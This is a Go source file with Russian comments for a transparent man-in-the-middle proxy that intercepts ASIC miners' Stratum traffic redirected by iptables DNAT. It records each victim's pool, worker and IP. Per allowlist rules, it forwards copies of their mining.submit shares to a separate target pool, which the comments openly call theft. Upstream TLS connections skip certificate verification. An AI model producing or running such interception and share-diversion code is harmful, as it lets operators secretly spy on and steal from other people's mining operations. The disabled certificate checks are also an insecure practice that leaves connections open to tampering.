package proxy

import (
	"bufio"
	"crypto/tls"
	"io"
	"log"
	"net"
	"time"
)

// Таймауты и размеры буферов обработки одного соединения.
const (
	// idleTimeout — таймаут неактивности ASIC-сессии (Stratum). Если от
	// майнера не пришло данных дольше — соединение разрывается (ASIC «умер»).
	// Требование заказчика: сброс «умершей» сессии ~10 минут.
	idleTimeout = 10 * time.Minute

	// upstreamDialTimeout — таймаут установки TCP-соединения с пулом.
	upstreamDialTimeout = 10 * time.Second

	// writeTimeout — таймаут записи в пул. TCP-буфер пула может быть полон —
	// без таймаута writeLine зависла бы навсегда, съев goroutine. С таймаутом
	// соединение рвётся и ресурсы освобождаются (fail-open уровня сессии).
	writeTimeout = time.Minute

	// sniffTimeout — сколько ждём первые байты, чтобы понять: это Stratum
	// или просто поток (TLS/HTTP/…). Даже медленный ASIC шлёт subscribe сразу.
	sniffTimeout = 10 * time.Second

	// lineBuf / maxLineSize — буфер строки Stratum (JSON редко > 1КБ).
	lineBuf     = 4 * 1024
	maxLineSize = 16 * 1024
)

// ProxyPass — параметры проксирования одного соединения: куда ходить по
// умолчанию (fallback) и как определять реальный адресат.
type ProxyPass struct {
	// ListenAddr адрес нашего listener (host:port). Нужен, чтобы отличить
	// «прямой» коннект от DNAT-перенаправленного (см. dest.go isProxyAddr).
	ListenAddr string

	// Fallback реальный пул из конфига (upstream_pool) — используется, если
	// прозрачность выключена или исходный адресат не удалось восстановить
	// (локальный тест без iptables).
	Fallback string

	// FallbackSSL использовать TLS при подключении к Fallback (для прямого
	// теста без iptables). В прозрачном режиме TLS не терминируем никогда:
	// клиент сам держит TLS с пулом через нашу байтовую трубу.
	FallbackSSL bool

	// Transparent включает определение реального адресата через
	// SO_ORIGINAL_DST (iptables DNAT). По умолчанию true (см. config).
	Transparent bool

	// ResolveDest — необязательный переопределитель определения адресата.
	// Нужен только для тестов: позволяет эмулировать несколько пулов
	// (разные IP:port) без root и реального iptables. Если задан, вызывается
	// вместо resolveDestination и возвращает (адресат, ssl). В проде — nil.
	ResolveDest func(net.Conn) (string, bool)
}

// HandleConnection обрабатывает одно соединение от ASIC-майнера (или любого
// другого TCP-потока из разрешённой подсети).
//
// Схема:
//   клиент <---> мы <---> реальный пул (настоящий адресат из iptables DNAT)
//                    |
//                    +--> целевой пул («укушенная» копия шары)
//
// В прозрачном режиме адресат каждого соединения свой (у разных клиентов
// разные пулы). Для каждого соединения сначала смотрим первые строки:
//
//   - похоже на Stratum (JSON с методом mining.*) → построчный разбор,
//     копирование каждой mining.submit в реальный пул + опциональная «кража»;
//   - всё остальное (TLS, HTTP, что угодно ещё из подсети) → сквозная
//     байтовая труба без разбора (прозрачно, как требует заказчик).
func HandleConnection(clientConn net.Conn, pass ProxyPass, stealer *ShareStealer, disc *Discovery) {
	defer clientConn.Close()

	// --- 1. Определяем настоящий адресат (пул конкретного клиента) ---
	var dest string
	var destSSL bool
	if pass.ResolveDest != nil {
		dest, destSSL = pass.ResolveDest(clientConn)
	} else {
		dest, destSSL = resolveDestination(clientConn, pass)
	}

	// --- 1a. Регистрируем пул в реестре «базы» (пул+воркер) ---
	// Даже если пул сейчас недоступен, факт обращения полезен оператору.
	disc.ObservePool(dest)

	// --- 2. Подключаемся к нему (TCP; TLS — только в fallback-режиме). ---
	upstream, err := dialUpstream(dest, destSSL)
	if err != nil {
		log.Printf("[CONN] upstream dial %s: %v", dest, err)
		return
	}
	defer upstream.Close()

	log.Printf("[CONN] %s <-> %s (listen=%s)", clientConn.RemoteAddr(), dest, pass.ListenAddr)

	// --- 3. Смотрим первые байты: Stratum или прозрачный поток? ---
	// Читаем через bufio.Reader, чтобы прочитанное можно было переиспользовать
	// в обоих режимах (raw io.Copy или scanner). Возвращённые sniffedLines уже
	// извлечены из буфера reader и должны быть пересланы в пул вызывающим.
	reader := bufio.NewReaderSize(clientConn, lineBuf)
	clientConn.SetReadDeadline(time.Now().Add(sniffTimeout))
	stratum, sniffedLines := sniffStratum(reader)
	clientConn.SetReadDeadline(time.Time{})

	// Пересылаем всё, что sniffer уже прочитал и извлёк из буфера reader.
	// Без этого pipeMinerToPool (или io.Copy) заблокируется на чтении следующей
	// строки от клиента — а клиент ждёт ответа на подписку и стоит.
	if len(sniffedLines) > 0 {
		upstream.SetWriteDeadline(time.Now().Add(writeTimeout))
		for _, line := range sniffedLines {
			if _, err := upstream.Write(line); err != nil {
				log.Printf("[CONN] write sniffed to upstream: %v", err)
				return
			}
		}
	}

	done := make(chan struct{}, 2)

	if stratum {
		// Поток 1: майнер -> пул, построчно, с перехватом mining.submit.
		go func() {
			pipeMinerToPool(clientConn, reader, dest, upstream, stealer, disc)
			done <- struct{}{}
		}()
	} else {
		// Поток 1: не-стратум — прозрачная байтовая труба в обе стороны.
		go func() {
			if _, err := io.Copy(upstream, reader); err != nil {
				log.Printf("[CONN] miner->pool copy: %v", err)
			}
			done <- struct{}{}
		}()
	}

	// Поток 2: пул -> майнер, всегда прозрачный passthrough.
	go func() {
		if _, err := io.Copy(clientConn, upstream); err != nil {
			log.Printf("[CONN] pool->miner copy: %v", err)
		}
		done <- struct{}{}
	}()

	// Ждём завершения любого из потоков — это означает разрыв соединения.
	<-done
	log.Printf("[DISCONNECT] %s", clientConn.RemoteAddr())
}

// dialUpstream создаёт TCP или TLS соединение с пулом.
func dialUpstream(addr string, ssl bool) (net.Conn, error) {
	if ssl {
		// InsecureSkipVerify — публичные пулы часто с самоподписанными
		// сертификатами; необходимо для работы (риск осознан, см. ARCHITECTURE).
		return tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
	}
	return net.DialTimeout("tcp", addr, upstreamDialTimeout)
}

// sniffStratum определяет, ведёт ли соединение Stratum-майнер: реальный ASIC
// начинает с mining.subscribe / mining.authorize (JSON, метод "mining.*").
// Читаем не более нескольких строк; прочитанные строки возвращаются — это
// данные, которые sniffer уже извлёк из буфера, их обязан переслать вызывающий.
// Таймаут на чтение (sniffTimeout) уже выставлен вызывающей стороной.
func sniffStratum(reader *bufio.Reader) (stratum bool, lines [][]byte) {
	for i := 0; i < 3; i++ {
		line, err := reader.ReadBytes('\n')
		if err != nil {
			// Нет данных (таймаут, обрыв, TLS-блоб без \n) — это не стратум:
			// обрабатываем как обычный поток.
			return false, lines
		}
		lines = append(lines, line)
		if LooksLikeStratum(line) {
			return true, lines
		}
	}
	return false, lines
}

// pipeMinerToPool копирует данные от майнера к пулу построчно (Stratum V1:
// каждое сообщение = одна строка JSON + '\n'). Для каждой строки решаем:
// это mining.submit? Если да и stealer решил «укусить» — копия уходит
// целевому пулу; оригинал ВСЕГДА идёт реальному пулу.
//
// Заодно наполняем реестр discovery: authorize/submit дают воркера,
// submit — счётчики (pool+worker), что нужно для правил кражи (этап 4).
//
// clientConn нужен для таймаутов чтения (deadline ставится на сам TCP-сокет,
// сканер читает через буфер reader). pool — адресат этого соединения.
func pipeMinerToPool(clientConn net.Conn, reader *bufio.Reader, pool string, dst net.Conn, stealer *ShareStealer, disc *Discovery) {
	scanner := bufio.NewScanner(reader)
	scanner.Buffer(make([]byte, lineBuf), maxLineSize)

	// Таймаут чтения: если майнер «молчит» дольше idleTimeout — Read вернёт
	// таймаут, соединение закроется. Deadline обновляется при каждом чтении.
	clientConn.SetReadDeadline(time.Now().Add(idleTimeout))

	// Источник (IP клиента) — один раз, для записи в реестр.
	source := ""
	if a := clientConn.RemoteAddr(); a != nil {
		source = a.String()
	}

	for scanner.Scan() {
		// Получили данные — отодвигаем таймаут неактивности ещё на idleTimeout.
		clientConn.SetReadDeadline(time.Now().Add(idleTimeout))

		line := scanner.Bytes()

		// Scanner переиспользует буфер, поэтому сохраняем КОПИЮ строки —
		// она может понадобиться в отдельной goroutine (асинхронная отправка).
		lineCopy := make([]byte, len(line))
		copy(lineCopy, line)

		// Наполняем «базу» пул+воркер из живого трафика.
		switch {
		case IsMinerAuthorize(lineCopy):
			disc.ObserveWorker(pool, ExtractWorkerFromAuthorize(lineCopy), source)
		case IsMinerSubmit(lineCopy):
			worker := ExtractWorkerFromSubmit(lineCopy)
			disc.ObserveSubmit(pool, worker, source)

			// Оригинал ВСЕГДА уходит — иначе майнер не получит ответ на submit.
			// Для submit-ов дополнительно решаем, не «укусить» ли копию, с
			// учётом правил allowlist (пул+воркер, этап 4).
			if stealer.ShouldStealFor(pool, worker) {
				go func(data []byte) {
					if err := stealer.ForwardToTarget(data); err != nil {
						log.Printf("[REDIRECT] forward to target: %v", err)
					}
				}(lineCopy)
			}
		}

		// Таймаут записи, чтобы зависшая запись не держала goroutine вечно.
		dst.SetWriteDeadline(time.Now().Add(writeTimeout))
		if err := writeLine(dst, lineCopy); err != nil {
			log.Printf("[CONN] write to upstream: %v", err)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		// При превышении idleTimeout ловим таймаут и закрываем «умершую» сессию.
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			log.Printf("[CONN] idle timeout, closing session: %s", clientConn.RemoteAddr())
		} else if err == bufio.ErrTooLong {
			log.Printf("[CONN] oversized stratum line, closing: %s", clientConn.RemoteAddr())
		} else {
			log.Printf("[CONN] scanner: %v", err)
		}
	}
}

// writeLine пишет данные и терминальный '\n' в dst.
func writeLine(dst io.Writer, data []byte) error {
	buf := make([]byte, 0, len(data)+1)
	buf = append(buf, data...)
	buf = append(buf, '\n')
	_, err := dst.Write(buf)
	return err
}
